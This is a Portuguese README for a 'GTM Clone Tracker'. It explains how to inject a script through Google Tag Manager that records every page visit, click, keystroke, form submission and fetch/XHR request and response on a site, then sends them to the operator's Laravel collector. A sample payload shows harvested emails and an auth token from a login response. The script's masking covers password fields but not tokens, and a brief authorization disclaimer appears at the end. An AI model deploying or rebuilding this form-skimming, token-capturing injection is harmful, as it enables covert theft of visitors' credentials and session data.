# Instruções Rápidas - GTM Clone Tracker

## Resumo

Este script captura TODAS as informações que transitam no site clonador e envia para o seu servidor Laravel.

## Passo a Passo Rápido

### 1. Configurar a URL do Servidor

Edite o arquivo `public/gtm-tracker.js` na linha 5:

```javascript
const COLLECTOR_URL = 'https://SEU-SERVIDOR.com/api/collect';
```

Substitua `SEU-SERVIDOR.com` pelo domínio do seu projeto Laravel.

### 2. No Google Tag Manager do Site Clonador

1. **Tags** → **Nova**
2. Nome: `Clone Tracker`
3. Tipo: **HTML Personalizado**
4. Cole o conteúdo completo do arquivo `public/gtm-tracker.js`
5. Acionador: **All Pages** (Todas as páginas)
6. **Salvar** → **Publicar**

### 3. Pronto!

O script vai capturar automaticamente:

- ✅ Todas as páginas visitadas
- ✅ Todos os cliques
- ✅ Todos os formulários preenchidos
- ✅ Todas as requisições HTTP (fetch/AJAX)
- ✅ Todas as respostas de API
- ✅ Todos os inputs digitados

## O que Você Precisa Fazer

### No seu Servidor Laravel:

```bash
# 1. Certifique-se que o projeto está rodando
php artisan serve

# ou se estiver em produção, configure o domínio com HTTPS

# 2. Verifique se as migrations foram executadas
php artisan migrate

# 3. Configure CORS (importante!)
composer require fruitcake/laravel-cors
```

### Configurar CORS

Crie/edite o arquivo `config/cors.php`:

```php
<?php

return [
    'paths' => ['api/*'],
    'allowed_methods' => ['*'],
    'allowed_origins' => ['*'], // ou especifique o domínio do site clonador
    'allowed_headers' => ['*'],
    'exposed_headers' => [],
    'max_age' => 0,
    'supports_credentials' => false,
];
```

E registre o middleware em `bootstrap/app.php`:

```php
->withMiddleware(function (Middleware $middleware) {
    $middleware->alias([
        'basic.auth' => \App\Http\Middleware\BasicAuthMiddleware::class,
    ]);

    // Adicione esta linha:
    $middleware->api(append: [
        \Illuminate\Http\Middleware\HandleCors::class,
    ]);
})
```

## Como Usar no GTM

### Opção 1: Script Inline (Recomendado)

1. Copie todo o conteúdo do arquivo `public/gtm-tracker.js`
2. No GTM: **Tags** → **Nova** → **HTML Personalizado**
3. Cole o código dentro de tags `<script>...</script>`
4. Configure acionador para **All Pages**
5. Publique

### Opção 2: Script Externo

1. Hospede o arquivo `gtm-tracker.js` em um servidor acessível
2. No GTM, use:

```html
<script src="https://seu-servidor.com/gtm-tracker.js"></script>
```

## Testando

### 1. Testar o Endpoint

```bash
curl -X POST https://seu-servidor.com/api/collect \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "teste123",
    "domain": "site-clonado.com",
    "url": "https://site-clonado.com",
    "referrer": "",
    "screenResolution": "1920x1080",
    "language": "pt-BR",
    "timestamp": "2025-12-15T10:00:00.000Z",
    "requests": []
  }'
```

Deve retornar:
```json
{"status":"success","id":1}
```

### 2. Testar no Site

1. Publique a tag no GTM
2. Acesse o site clonador
3. Abra o Console (F12)
4. Procure: `[Clone Tracker] Initialized - Session: session_...`
5. Acesse seu dashboard: `https://seu-servidor.com`
6. Veja os logs chegando em tempo real

## O Que Será Capturado

### Dados do Navegador
- Session ID único por sessão
- Domínio e URL de cada página
- Referrer (de onde veio)
- Resolução da tela
- Idioma do navegador

### Eventos
```javascript
{
  "type": "page_load",           // Carregamento de página
  "type": "click",                // Cliques em elementos
  "type": "form_submit",          // Envio de formulários
  "type": "input_change",         // Digitação em campos
  "type": "fetch",                // Requisição fetch/AJAX
  "type": "fetch_response",       // Resposta de fetch
  "type": "xhr",                  // Requisição XMLHttpRequest
  "type": "xhr_response"          // Resposta de XHR
}
```

### Exemplo de Dados Capturados

```json
{
  "sessionId": "session_1734251234567_abc123",
  "domain": "site-clonado.com",
  "url": "https://site-clonado.com/login",
  "referrer": "https://google.com",
  "screenResolution": "1920x1080",
  "language": "pt-BR",
  "timestamp": "2025-12-15T12:30:00.000Z",
  "requests": [
    {
      "type": "page_load",
      "url": "https://site-clonado.com/login",
      "timestamp": "2025-12-15T12:30:00.000Z"
    },
    {
      "type": "input_change",
      "fieldName": "email",
      "fieldType": "email",
      "value": "usuario@email.com",
      "timestamp": "2025-12-15T12:30:05.000Z"
    },
    {
      "type": "input_change",
      "fieldName": "password",
      "fieldType": "password",
      "value": "[MASKED]",
      "timestamp": "2025-12-15T12:30:08.000Z"
    },
    {
      "type": "form_submit",
      "action": "https://site-clonado.com/api/login",
      "method": "POST",
      "fields": {
        "email": "usuario@email.com",
        "password": "[MASKED]"
      },
      "timestamp": "2025-12-15T12:30:10.000Z"
    },
    {
      "type": "fetch",
      "url": "https://site-clonado.com/api/login",
      "method": "POST",
      "body": "{\"email\":\"usuario@email.com\",\"password\":\"***\"}",
      "timestamp": "2025-12-15T12:30:10.100Z"
    },
    {
      "type": "fetch_response",
      "url": "https://site-clonado.com/api/login",
      "status": 200,
      "body": {
        "token": "eyJhbGciOiJIUzI1NiIs...",
        "user": {
          "id": 123,
          "name": "João Silva"
        }
      },
      "timestamp": "2025-12-15T12:30:10.500Z"
    }
  ]
}
```

## Proteção de Dados Sensíveis

O script automaticamente mascara:
- Campos de senha (`password`, `senha`)
- Campos de cartão (`card`, `cvv`)
- Qualquer campo sensível

Esses aparecem como `[MASKED]` nos logs.

## Frequência de Envio

Os dados são enviados:
- A cada **10 segundos** automaticamente
- **2 segundos** após carregar a página
- Ao **fechar a página** (usando `sendBeacon`)

## Visualizar os Dados

1. Acesse: `https://seu-servidor.com`
2. Faça login com suas credenciais
3. Veja o dashboard com:
   - Total de logs
   - Total de sessões
   - Total de domínios rastreados
   - Total de IPs únicos
   - Lista de domínios mais acessados
   - Logs em tempo real

## Exportar Dados

Acesse: `https://seu-servidor.com/export`

Baixa um arquivo JSON com todos os logs.

## Problemas Comuns

### "CORS error"
- Configure o CORS no Laravel (veja acima)
- Certifique-se que `allowed_origins` inclui o domínio do site clonador

### "Session not found"
- Normal no primeiro acesso
- O session ID é criado automaticamente

### Dados não aparecem
- Verifique o Console (F12) por erros
- Teste o endpoint com `curl` (veja acima)
- Verifique `storage/logs/laravel.log`

### Tag não dispara no GTM
- Use o modo **Visualizar** do GTM para debugar
- Verifique se o acionador é **All Pages**
- Confirme que a tag está **publicada**

## Monitoramento

```bash
# Ver logs em tempo real
tail -f storage/logs/laravel.log

# Ver apenas atividades clonadas
tail -f storage/logs/laravel.log | grep "Clone activity"
```

## Segurança

⚠️ **IMPORTANTE**:
- Use apenas em sites que você tem autorização
- Respeite leis de privacidade (LGPD, GDPR)
- Dados sensíveis são mascarados automaticamente
- Configure HTTPS no servidor

## Suporte

Se precisar de ajuda:
1. Verifique `storage/logs/laravel.log`
2. Use o Console do navegador (F12)
3. Teste com o comando `curl` acima

---

**Pronto! Agora você pode capturar todas as informações do site clonador via GTM!** 🎯
